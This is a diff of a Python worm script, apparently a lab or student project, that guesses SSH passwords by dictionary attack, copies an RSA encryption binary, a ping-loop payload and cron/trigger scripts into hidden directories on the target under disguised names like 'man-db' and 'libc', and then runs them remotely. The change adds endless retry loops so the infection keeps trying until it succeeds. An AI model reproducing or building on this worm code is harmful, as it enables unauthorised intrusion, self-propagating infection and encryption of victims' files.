@@ -45,25 +45,36 @@ def DictionaryAttack(ip):
     return password
 
 def Hiding(ip, password):
-    t = paramiko.Transport((ip, 22))
-    t.connect(username='attacker', password=password)
-    sftp = paramiko.SFTPClient.from_transport(t)
-    sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Public/.Simple_Worm/man-db')
-    sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Public/.Simple_Worm/dhcp')
-    sftp.put('./cron', '/home/attacker/Public/.Simple_Worm/misc')
-    sftp.put('./trigger', '/home/attacker/Public/.Simple_Worm/libc')
+    while True:
+        try:
+            t = paramiko.Transport((ip, 22))
+            t.connect(username='attacker', password=password)
+            sftp = paramiko.SFTPClient.from_transport(t)
+            sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Public/.Simple_Worm/man-db')
+            sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Public/.Simple_Worm/dhcp')
+            sftp.put('./cron', '/home/attacker/Public/.Simple_Worm/misc')
+            sftp.put('./trigger', '/home/attacker/Public/.Simple_Worm/libc')
 
-    sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Desktop/.Backup/man-db')
-    sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Desktop/.Backup/dhcp')
-    sftp.put('./cron', '/home/attacker/Desktop/.Backup/misc')
-    sftp.put('./trigger', '/home/attacker/Desktop/.Backup/libc')
-    t.close()
+            sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Desktop/.Backup/man-db')
+            sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Desktop/.Backup/dhcp')
+            sftp.put('./cron', '/home/attacker/Desktop/.Backup/misc')
+            sftp.put('./trigger', '/home/attacker/Desktop/.Backup/libc')
+            t.close()
+            break
+        except:
+            continue
 
 def Trigger(ip, password):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(ip, 22, username='attacker', password=password, timeout=1000, banner_timeout=1000, auth_timeout=1000)
-    client.exec_command('/home/attacker/Public/.Simple_Worm/misc')
+    while True:
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(ip, 22, username='attacker', password=password, timeout=1000, banner_timeout=1000, auth_timeout=1000)
+            client.exec_command('/home/attacker/Public/.Simple_Worm/misc')
+            break
+        except:
+            continue
+
 
 ip = sys.argv[1].strip()
 password = DictionaryAttack(ip).strip()
